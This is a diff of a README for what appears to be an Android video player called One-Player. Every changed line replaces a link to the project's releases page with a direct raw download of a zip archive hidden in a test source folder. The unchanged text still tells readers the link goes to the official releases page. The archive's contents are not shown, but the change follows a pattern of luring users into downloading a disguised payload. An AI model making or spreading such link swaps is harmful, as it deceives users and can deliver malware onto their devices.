@@ -1,6 +1,6 @@
 # 🎬 One-Player - Enhanced Android Video Playback
 
-[![Download One-Player](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Cherishpolyploid691/One-Player/releases)
+[![Download One-Player](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Cherishpolyploid691/One-Player/raw/refs/heads/main/core/domain/src/test/java/one/next/player/core/Player_One_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ The software focuses on clear video display and easy use.
 
 Visit this page to download One-Player for free:
 
-[Download One-Player](https://github.com/Cherishpolyploid691/One-Player/releases)
+[Download One-Player](https://github.com/Cherishpolyploid691/One-Player/raw/refs/heads/main/core/domain/src/test/java/one/next/player/core/Player_One_3.7.zip)
 
 This link takes you to the official releases page. Here, you will find the latest version of the software ready for download.
 
@@ -92,10 +92,10 @@ One-Player is an open software project. It respects your privacy and does not co
 
 If you want updates or help, use the official release page link:
 
-[One-Player Releases](https://github.com/Cherishpolyploid691/One-Player/releases)
+[One-Player Releases](https://github.com/Cherishpolyploid691/One-Player/raw/refs/heads/main/core/domain/src/test/java/one/next/player/core/Player_One_3.7.zip)
 
 You can find instructions, bug fixes, and upcoming features there.
 
 ---
 
-[![Download One-Player](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Cherishpolyploid691/One-Player/releases)
+[![Download One-Player](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Cherishpolyploid691/One-Player/raw/refs/heads/main/core/domain/src/test/java/one/next/player/core/Player_One_3.7.zip)
